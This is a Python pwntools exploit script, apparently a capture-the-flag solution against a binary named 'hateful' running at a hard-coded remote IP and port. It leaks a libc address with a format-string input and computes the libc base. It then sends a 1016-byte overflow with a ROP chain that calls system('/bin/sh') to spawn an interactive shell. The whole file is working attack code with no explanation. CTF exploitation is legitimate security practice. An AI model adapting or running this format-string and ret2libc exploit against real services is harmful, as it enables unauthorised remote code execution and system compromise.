#!/usr/bin/env python3
from pwn import *

context.binary = binary = ELF("./hateful_patched",checksec=False)
libc = ELF("./libc.so.6",checksec=False)

libc_offset = 0x1d2a80

p = remote('52.59.124.14', 5020)
#p = process()

p.sendlineafter(b'>> ', b'yay')
p.sendlineafter(b'>> ', b'%5$p')

p.recvuntil(b'email provided: ')
libc_leak = int(p.recvline()[:-1].decode(), 16)
libc.address = libc_leak - libc_offset

info(f'libc base: {hex(libc.address)}')

rop = ROP(libc)

pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
ret = p64(rop.find_gadget(['ret'])[0])

system = p64(libc.symbols.system)
bin_sh = p64(next(libc.search(b'/bin/sh\x00')))

ropchain = b'A' * 1016
ropchain += pop_rdi
ropchain += bin_sh
ropchain += ret
ropchain += system

p.sendline(ropchain)
p.recvrepeat(1)

p.interactive()
